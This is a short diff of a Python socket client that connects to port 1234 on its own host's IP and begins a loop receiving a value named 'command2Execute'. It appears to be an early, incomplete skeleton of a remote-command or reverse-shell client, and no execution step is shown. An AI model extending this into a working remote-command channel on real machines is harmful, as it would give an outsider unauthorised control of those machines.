@@ -4,15 +4,14 @@ import socket
 s=socket.socket()
 
 #Grab client IP address
-CLIENT_IP=socket.gethostbyname(socket.gethostname())
+CLIENT_HOSTNAME = socket.gethostname()
+CLIENT_IP=socket.gethostbyname(CLIENT_HOSTNAME)
 
 PORT=1234
 #IP address for the server
 s.connect((CLIENT_IP, PORT))
 
-
 #Recieving Loop
-
 while True:
 
-    client
+    command2Execute = s.recv(1024).decode()
